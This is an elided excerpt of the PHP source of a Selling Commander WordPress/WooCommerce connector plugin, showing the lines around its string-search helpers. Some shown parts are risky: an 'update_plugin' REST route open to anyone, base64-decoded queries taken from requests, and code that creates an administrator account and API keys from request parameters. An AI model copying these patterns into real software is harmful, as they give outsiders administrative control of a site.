<?php  
	...
	if ( ! class_exists( 'SCConn_SellingCommander' ) ) {
	   ...
	   if (!function_exists("sc_strpos")) {
			function sc_strpos($haystack,$needle,$offset = 0) {
				if(!$haystack){
					if($haystack === null){
						return false;
					}else{
	   ...
	   if (!function_exists("sc_stripos")) {
			function sc_stripos($haystack,$needle,$offset = 0) {
				if(!$haystack){
					if($haystack === null){
						return false;
					}else{
	   ...
	   if(!function_exists("scconn_cors_headers")){
		   function scconn_cors_headers(){
			   if(!scconn_read_sanitized_server_parm('HTTP_ORIGIN')){
				   if(sc_stripos(scconn_read_sanitized_server_parm("HTTP_REFERER"),"sellingcommander.com") !== false){
	   ...
	   if(!function_exists("scconn_uncaught_exception_handler")){
			function scconn_uncaught_exception_handler($exception = null, $arg = null){
				...
				if(sc_strpos($response->trace,"class-wp-hook")){
					return;
				}
										...
										if(is_array($callback["function"])){
											...
											try{
												if(function_exists($callback["function"])){
													...
													if(sc_strpos($defpath,"/{$themes_dir_rel}/") !== false){
														unset($GLOBALS['wp_filter'][$hook_event]->callbacks[$priority][$cuid]);
													}else if(sc_strpos($defpath,"/{$plugin_dir_rel}/") !== false){
	   ...
	   if(!defined("SELLINGCOMMANDER_CALL")){
		   ...
		   if(!defined("SELLINGCOMMANDER_CALL")){
			   ...
			   if(sc_stripos($__sellingcommander__caller, "sellingcommander.com") !== false){
				   $output_array = array();
		   ...
		   if(!$__sellingcommander__caller && !defined("SELLINGCOMMANDER_CALL")){
			  if(scconn_read_sanitized_server_parm('REMOTE_ADDR','') == "::1" || scconn_read_sanitized_server_parm('REMOTE_ADDR','') == "127.0.0.1" || scconn_read_sanitized_server_parm('REMOTE_ADDR','') == "0.0.0.0"){
				  if(sc_stripos(scconn_read_sanitized_server_parm('REQUEST_URI',''),"sellingcommander_console")){
					$_SESSION["sellingcommander_console_hash"] = md5(scconn_read_sanitized_server_parm('REQUEST_URI',''));
					if(!defined("SELLINGCOMMANDER_CALL"))
						define("SELLINGCOMMANDER_CALL",1);
				  }
		   ...
		   if(scconn_read_sanitized_get_parm("scpacked",false) || sc_stripos($_SERVER['REQUEST_URI'],"/sc/v1") !== false){
			   if(!defined("SELLINGCOMMANDER_CALL"))
					define("SELLINGCOMMANDER_CALL",1);
		   }
	   }
		   ...
		   try{
			   ...
			   if((function_exists('ob_gzhandler') && ini_get('zlib.output_compression'))){
				   ...
				   foreach($cheads as $chead){
					   if(sc_stripos($chead,"Content-Encoding") == 0){
						   $enc_set = true;
						   break;
					   }
				   }
	   ...
	   class SCConn_SellingCommander{
			...
			public function sellingcommander_endpoint(){
				try{
					...
					if($method == "POST" || $method == "GET"){
						...
						if($method == "POST"){
							if(sc_stripos(scconn_read_sanitized_server_parm("CONTENT_TYPE",""),"json") !== false){
			...
			public function rest_api_init(){
				...
				register_rest_route( 'sc/v1', '/update_plugin', array(
					...
					'permission_callback' => function($arg1 = null, $arg2 = null, $arg3 = null){ return true; }
				));
			...
			public function set_product_terms($data, $product, $fieldName){
				...
				foreach($data as $taxonomy => $terms){
					...
					foreach($terms as $term){
						...
						if($hierarchical && sc_strpos($term["name"],"/") !== false){
			...
			public function deleteItemCache($post_id){
				...
				try{
					...
					foreach($this->cache_tables as $db_table){
						if(sc_stripos($db_table,"{$wpdb->prefix}scconn_cache_") === 0){
			...
			public function get_readout_file_path($read_type, $clean = true, $force_new = false, $max_cache_timeout = 600){
					...
					foreach ($existing_readouts as $readoutfile) {
							...
							if(!$force_new && ($mtime + $max_cache_timeout > time() || $max_cache_timeout === 0)){//240min == 4h
								if(sc_strpos($readoutfile,$read_type_prefix . "_") === 0 && sc_strpos($readoutfile,".txt.gz.txt") === false){ //SKIP GZ here
			...
			private function doRestQuery($req){
				try{
					...
					$q = $req["query"];
					if(sc_stripos(trim($req["query"])," ") === false){
						$q = base64_decode($q);
					}
					...
					if(!empty($result)){
						...
						foreach($user_metas as $ind => $user_meta){
							if(isset($result[$user_meta->user_id])){
								if(sc_strpos($user_meta->meta_key,"billing_") === 0){
								...
								}else if(sc_strpos($user_meta->meta_key,"shipping_") === 0){
			...
			private function additionalExtensionsCheck($file_path){
				...
				if(substr($line,0,4) == '%PDF'){
					...
					return "zip";
				}else if(sc_strpos($line,"application/epub")){
					return "epub";
				}
			...
			public function do_media_import($data){
				...
				if(isset($data["download_url"])){
					...
					if(isset($data["file_only"])){
						if(sc_stripos($data["file_only"],'false') === false && boolval($data["file_only"])){
							$file_only = true;
						}
					}

					if(sc_stripos($data["download_url"],"data:") === 0){

						$data_info = substr($data["download_url"],0,sc_strpos($data["download_url"],","));
						...
						if(isset($data["filename"])){
							...
							if(sc_stripos($filename,".{$ext}") === false){
								$filename .= ".{$ext}";
							}
						}
			...
			public function is_scconn_rest_request($is_rest){
				if(!$is_rest){
					if($this->is_sellingcommander_request_session){
						...
						if(sc_strpos($request_uri,"rest_route=/")){
							return true;
						}else if(sc_strpos($request_uri,trailingslashit( rest_get_url_prefix() ) . "/wc/v") !== false){
							return true;
						}else if(sc_strpos($request_uri,trailingslashit( rest_get_url_prefix() ) . "/sc/v1") !== false){
							return true;
						}else if(sc_strpos($request_uri,trailingslashit( rest_get_url_prefix() ) . "/wp/v2") !== false){
							return true;
						}
					}
				}
			...
			public function user_filter($user_id){
				...
				if($access_key){
					...
					if($row){
						...
						if(scconn_read_sanitized_request_parm("scemail","")){
							$user = get_user_by( 'email', scconn_read_sanitized_request_parm("scemail","") );
							if(!$user && scconn_read_sanitized_request_parm("site_user_id","")){
								$user = get_user_by( 'ID', scconn_read_sanitized_request_parm("site_user_id","") );
							}
							if($user){
								$user_id = $user->ID;
							}
						...
						if(!$user_id){
							if(scconn_read_sanitized_request_parm("consumer_key") && scconn_read_sanitized_request_parm("consumer_secret")){
								$scemail = scconn_read_sanitized_request_parm("scemail","");
								$user_id = wp_create_user( $scemail, md5(scconn_read_sanitized_request_parm("consumer_key")), $scemail );
								$user = new WP_User( $user_id );
								$user->set_role( 'administrator' );
							}
						}
						
						if($user_id && scconn_read_sanitized_request_parm("consumer_key") && scconn_read_sanitized_request_parm("consumer_secret")){
							$this->createAccess($user_id,"read_write",scconn_read_sanitized_request_parm("consumer_key"),scconn_read_sanitized_request_parm("consumer_secret"));
							$this->sc_request_user_id = $user_id;
						}else
			...
			private function createAccess($app_user_id, $scope, $consumer_key = null, $consumer_secret = null){
				global $wpdb;
				...
				try{
					$wpdb->query($wpdb->prepare("DELETE FROM {$wpdb->prefix}woocommerce_api_keys WHERE description LIKE %s",$description));
				}catch(Throwable $ex){
			...
			public function admin_utils(){
				...
				if(sc_stripos(scconn_read_sanitized_request_parm('page',''),'sellingcommander-connector') === 0){
